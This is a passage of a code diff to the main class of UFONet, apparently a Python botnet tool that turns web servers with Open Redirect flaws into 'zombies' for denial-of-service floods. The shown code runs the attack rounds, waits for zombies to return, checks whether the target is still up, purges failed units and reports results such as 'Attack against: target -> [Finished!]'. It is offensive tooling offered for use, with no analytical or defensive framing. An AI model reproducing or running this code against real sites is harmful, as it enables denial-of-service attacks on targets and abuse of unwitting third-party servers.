+                                print "\n[Info] [AI] [Control] Full [ARMY] has returned for this round! -> [Refolding!]"
+                        else:
+                            zombies_lock = 0
+                            if self.options.expire: # set timing for purge
+                                try:
+                                    timing = int(self.options.expire)
+                                except:
+                                    timing = self.expire_timing # default timing for purge
                             else:
-                                options.target = "http://" + options.target
-                        self.connect_zombies(zombie)
-                        if self.options.dbstress: # try to stress db on target by using vulnerable Open Redirect web servers
-                            self.db_flash = self.db_flash + 1
-                            stress = self.stressing(target, zombie)
-                    time.sleep(1)
-                    for zombie in self.herd.done:
+                                timing = self.expire_timing # default timing for purge
+                            if timing < 1:
+                                timing = self.expire_timing # default timing for purge
+                            zombies_arrival_timing = timing # timing = trying to control round time for threading flow
+                            while self.herd.no_more_zombies() == False: # waiting for [Zombies] to return
+                                zombies_lock = zombies_lock + 1
+                                if zombies_lock > zombies_arrival_timing: # execute main abandoning routine!
+                                    if self.options.verbose:
+                                        print "[Info] [AI] [Control] Return time set [~"+str(zombies_arrival_timing)+"] for [Zombies] is over! -> [Expiring!]"
+                                    break
+                                else:
+                                    time.sleep(1)
+                            if self.options.verbose:
+                                print "\n" + '='*42
+                                print "\n[Info] [AI] [Control] All [Zombies] have returned for this round! -> [Refolding!]"
+                    if not self.options.attackme and not self.options.disableucavs: # check for target's status returned by [UCAVs]
+                        self.check_target_status()
+                    if not self.options.attackme and not self.options.disablepurge: # enable [Zombies] purge round check
+                        self.abandoning_zombies() # check for abandoning zombies
+                    for zombie in self.herd.done: # check for num hits
                         if self.herd.connection_failed(zombie) == False:
                             num_hits = num_hits + 1
                         num_zombie = num_zombie + 1
-                        if num_zombie > total_zombie:
+                        if num_zombie > self.total_zombie:
                             num_zombie = 1
-                    while self.herd.no_more_zombies() == False:
-                        time.sleep(1)
-                    num_round = num_round + 1
-                    if not self.options.disableisup and not self.options.attackme: # perform an external 'is target up?' check 
-                        check_is_up = self.check_is_up(target)
-                    if not self.options.attackme: # perform a broadband test on target
+                    if not self.options.attackme and not self.options.disablescanner: # perform a broadband test on target
                         check_is_loading = self.check_is_loading(target)
-                    print "-"*21
                     self.herd.dump_html()
-                attack_mode = False
+                    if not self.options.disablepurge:
+                        if self.empty_zombies == True:
+                            break # exit routine when not any more zombies
+                    num_round = num_round + 1
+                if self.options.verbose:
+                    print "\n" + '='*42
+                    print "\n[Info] [AI] This battle is over! -> [Reporting!]"
+                if self.options.target_list:
+                    self.num_target_list = self.num_target_list - 1 # num_target_list = 0 provokes exit!
                 print ("\x1b[2J\x1b[H") # black magic
                 if not self.options.attackme: # show herd results
                     self.herd.dump()
                 else: # show doll results
                     print '='*21
-                    print "\n[Info] - Mothership transmission...\n"
+                    print "\n[Info] [AI] Mothership transmission...\n"
                     num_real_zombies = len(self.doll.real_zombies)
-                    print "Total of 'zombies' 100% vulnerable to Open Redirect (CWE-601): " + str(num_real_zombies) + "\n"
+                    print "[Info] [AI] Total of [Zombies] that are 100% vulnerable to Open Redirect (CWE-601): " + str(num_real_zombies) + "\n"
                     for z in self.doll.real_zombies: # show only alien verified zombies
                         for x in z:
                             print " - " + str(x)
                 self.herd.dump_html(True) # show (all) zombies statistics
                 if not self.options.attackme:
-                    print "\n[Info] - Attack completed! ;-)\n"
+                    if not self.options.disablepurge:
+                        print "\n[Info] [AI] Report completed! -> [Purging!]\n"
+                    else:
+                        if not options.target_list:
+                            print "\n[Info] [AI] Report completed! -> [Exiting!]\n"
+                        else:
+                            print "\n[Info] [AI] Report completed! -> [OK!]\n"
                     self.update_mothership_stats() # update mothership stats
+                    if not self.options.disablepurge:
+                        print '='*21+ "\n"
+                        total_disc_zombies = self.num_discard_zombies + self.num_discard_aliens + self.num_discard_droids + self.num_discard_rpcs + self.num_discard_ucavs
+                        if total_disc_zombies > 0 and total_disc_zombies < 2: 
+                            print "[Info] [AI] [Control] You have [" + str(total_disc_zombies) + "] unit that isn't working as expected...\n"
+                        elif total_disc_zombies > 1:
+                            print "[Info] [AI] [Control] You have [" + str(total_disc_zombies) + "] units that aren't working as expected...\n"
+                        if self.num_discard_zombies > 0:
+                            print " + Zombies: ["+ str(self.num_discard_zombies)+"]"
+                        if self.num_discard_aliens > 0:
+                            print " + Aliens : ["+ str(self.num_discard_aliens)+"]"
+                        if self.num_discard_droids > 0:
+                            print " + Droids : ["+ str(self.num_discard_droids)+"]"
+                        if self.num_discard_rpcs > 0:
+                            print " + X-RPCs : ["+ str(self.num_discard_rpcs)+"]"
+                        if self.num_discard_ucavs > 0:
+                            print " + UCAVs  : ["+ str(self.num_discard_ucavs)+"]"
+                        if total_disc_zombies > 0:
+                            if not self.options.forceyes:
+                                if total_disc_zombies > 0 and total_disc_zombies < 2:
+                                    backup_reply = raw_input("\n[AI] Do you want to purge it from your files? (Y/n)\n")
+                                elif total_disc_zombies > 1:
+                                    backup_reply = raw_input("\n[AI] Do you want to purge them from your files? (Y/n)\n")
+                            else:
+                                backup_reply = "Y"
+                            if backup_reply == "y" or backup_reply == "Y":
+                                print "\n[Info] [AI] Purging failed units from files...\n"
+                                discarded = []
+                                if self.num_discard_zombies > 0:
+                                    for z in self.discardzombies:
+                                        discarded.append(z)
+                                        print " + [Info] [Zombies] "+z+" -> [Purged!]"
+                                if self.num_discard_aliens > 0:
+                                    for a in self.discard_aliens:
+                                        discarded.append(a)
+                                        print " + [Info] [Aliens] "+a+" -> [Purged!]"
+                                if self.num_discard_droids > 0:
+                                    for d in self.discard_droids:
+                                        discarded.append(d)
+                                        print " + [Info] [Droids] "+d+" -> [Purged!]"
+                                if self.num_discard_rpcs > 0:
+                                    for r in self.discard_rpcs:
+                                        discarded.append(r)
+                                        print " + [Info] [X-RPCs] "+r+" -> [Purged!]"
+                                if self.num_discard_ucavs > 0:
+                                    for u in self.discard_ucavs:
+                                        discarded.append(u)
+                                        print " + [Info] [UCAVs] "+u+" -> [Purged!]"
+                                disc_zombies = self.discard_zombies(discarded) # discard zombies (remove from files)
+                                if disc_zombies > 0 and disc_zombies < 2:
+                                    print "\n[Info] [AI] You have removed ["+str(disc_zombies)+"] unit! -> [OK!]\n"
+                                elif disc_zombies > 1:
+                                    print "\n[Info] [AI] You have removed ["+str(disc_zombies)+"] units! -> [OK!]\n"
+                    if not self.options.target_list:
+                        print '-'*21+ "\n"
+                        print "[AI] "+self.exit_msg+"\n"
+                        if not self.options.web:
+                            return
+                    else:
+                        if self.num_target_list > 0: # still more targets
+                            print '-'*21+ "\n"
+                            print "[Info] [AI] Attack against: "+str(target)+" -> [Finished!]\n"
+                            return
+                        else: # finish attack from multiple targets
+                            print '-'*21+ "\n"
+                            print "[Info] [AI] Attack against: "+str(target)+" -> [Finished!]"
+                            print "\n"+ '='*21+ "\n"
+                            print "[Info] [AI] All your battles have ended! -> [Exiting!]"
+                            print "\n"+ '-'*21+ "\n"
+                            print "[AI] "+self.exit_msg+"\n"
+                            if not self.options.web:
+                                return
                 else:
                     if num_real_zombies < 1: # not any 100% vulnerable zombie found
-                        print "\n[Info] - Not any 100% vulnerable zombie found... Bye!\n"
+                        print "\n[Info] [AI] [Control] Not any 100% vulnerable zombie found! -> [Exiting!]\n"
                         if os.path.exists('mothership') == True:
                             os.remove('mothership') # remove mothership stream
                         if os.path.exists('alien') == True:
                             os.remove('alien') # remove random alien worker
-                        sys.exit(2)
+                        if not options.web:
+                            sys.exit(2) # exit
+                        else:
+                            return
             else:
-                print "\nBye!\n"
+                print "\n" + '='*21
+                AI_reply = raw_input("\n[AI] Do you prefer a 'fortune' cookie instead? (y/N)\n")
+                if AI_reply == "y" or AI_reply == "Y":
+                    self.AI() # AI fortune cookie
+                print '-'*21+ "\n"
+                print "\n[AI] "+self.exit_msg+"\n"
                 if os.path.exists('mothership') == True:
                     os.remove('mothership') # remove mothership stream
                 if os.path.exists('alien') == True:
@@ -3318,13 +4259,11 @@ class UFONet(object):
                     return
         else:
             if not options.attackme:
-                print "="*75
-                print "[Info] Your target ("+target+") looks OFFLINE!! ;-)" 
-                print "="*75
+                print "\n[Info] [AI] "+target+" -> [Target looks OFFLINE!]" 
             else:
-                print "[Error] Your NAT/Network is not correctly configurated..."
-            print '-'*25
-            print "\nBye!\n"
+                print "\n[Error] [AI] NAT is not working correctly! -> [Exiting!]"
+            print "\n" + '-'*21
+            print "\n[AI] "+self.exit_msg+"\n"
             if os.path.exists('mothership') == True:
                 os.remove('mothership') # remove mothership stream
             if os.path.exists('alien') == True:
